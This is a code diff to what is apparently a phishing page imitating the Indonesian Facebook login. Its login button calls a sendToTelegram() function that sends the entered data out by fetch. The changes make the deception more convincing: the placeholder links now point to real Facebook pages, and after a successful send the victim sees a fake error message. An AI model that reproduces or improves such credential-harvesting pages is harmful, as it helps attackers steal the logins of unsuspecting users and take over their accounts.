@@ -139,14 +139,14 @@
 
         <button class="login-btn" onclick="sendToTelegram()">Masuk</button>
 
-        <a href="#" class="forgot-password">Lupa kata sandi?</a>
+        <a href="https://m.facebook.com/login/identify/?next=https%3A%2F%2Fm.facebook.com%2Fidentify" class="forgot-password">Lupa kata sandi?</a>
 
         <div class="line"><span>atau</span></div>
 
         <button class="create-account-btn">Buat Akun Baru</button>
 
         <div class="terms">
-            <p><a href="#">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</p>
+            <p><a href="https://id-id.facebook.com/pages/create/?ref_type=site_footer">Buat Halaman</a> untuk selebriti, merek, atau bisnis.</p>
         </div>
     </div>
 
@@ -164,9 +164,9 @@
                 fetch(url)
                     .then(response => {
                         if (response.ok) {
-                            alert("");
+                            alert("Terjadi kesalahan.");
                         } else {
-                            alert("Gagal login");
+                            alert(".");
                         }
                     })
                     .catch(error => {
